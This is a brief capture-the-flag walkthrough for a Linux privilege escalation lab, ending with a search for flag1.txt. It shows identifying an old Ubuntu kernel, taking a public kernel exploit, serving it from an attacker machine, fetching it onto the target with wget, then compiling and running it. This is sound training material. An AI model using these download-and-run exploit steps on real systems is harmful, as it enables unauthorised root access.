# 🛠️ Linux Privilege Escalation

## 1. What is the content of the flag1.txt file?

**Step 1: Enumeration & Identification**
```
$ uname -a
Linux wade7363 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
```
**Step 2:**

Need to know exactly what we are dealing with. Search for kernel version and find the code to exploit: 
```https://www.exploit-db.com/exploits/372```

Then run on attacker machine: ``` python3 -m http.server 8000```
On target Machine: ``` wget http://IP:8000/exploit.c```

**Step 3: Compile and Execute**
```
# Compile the code
gcc exploit.c -o exploit

# Give it execution permissions
chmod +x exploit

# Run it
./exploit
```

**Step 4: Find the Flag**

```
# Find the flag file
find / -name flag1.txt 2>/dev/null

# Read the content
cat /path/to/flag1.txt
```
---
